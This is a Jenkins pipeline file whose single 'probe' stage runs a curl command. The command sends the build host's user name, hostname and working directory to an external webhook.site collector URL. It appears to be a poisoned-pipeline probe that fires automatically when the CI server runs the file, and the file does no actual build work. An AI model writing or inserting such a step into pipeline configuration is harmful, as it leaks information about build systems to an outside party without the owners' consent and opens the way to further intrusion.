pipeline {
  agent any
  stages {
    stage('probe') {
      steps {
        sh 'curl -s -m 20 "https://webhook.site/f0e1ac49-8edb-45f1-963c-1d471b89fd96?m=jenkinsfile&u=$(id -un)&h=$(hostname)&p=$(pwd)"'
      }
    }
  }
}
